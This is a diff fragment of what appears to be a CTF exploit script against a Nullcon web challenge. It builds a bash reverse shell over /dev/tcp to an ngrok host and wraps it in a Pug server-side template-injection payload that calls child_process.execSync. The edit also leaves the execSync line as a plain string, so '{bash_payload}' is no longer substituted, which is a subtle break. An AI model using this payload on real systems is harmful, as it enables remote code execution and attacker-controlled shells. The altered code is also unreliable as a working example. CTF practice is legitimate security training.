@@ -13,14 +13,18 @@ URL = 'http://web2.ctf.nullcon.net:8081'
 NG_HOST = '0.tcp.ngrok.io'
 NG_PORT = '13764'
 
+
 def url_encode(s):
     return ''.join('%{0:0>2}'.format(format(ord(c), 'x')) for c in s)
 
 
-bash_payload = f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{NG_HOST}/{NG_PORT} 0>&1'"
+bash_payload = (
+    f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{NG_HOST}/{NG_PORT} 0>&1'"
+)
 pug_payload = '+'.join(
     f'Z({ord(c)})' for c in
-    f'global.process.mainModule.require("child_process").execSync("{bash_payload}")'
+    f'global.process.mainModule.require("child_process")'
+    '.execSync("{bash_payload}")'
 )
 
 pug_injection = url_encode("""
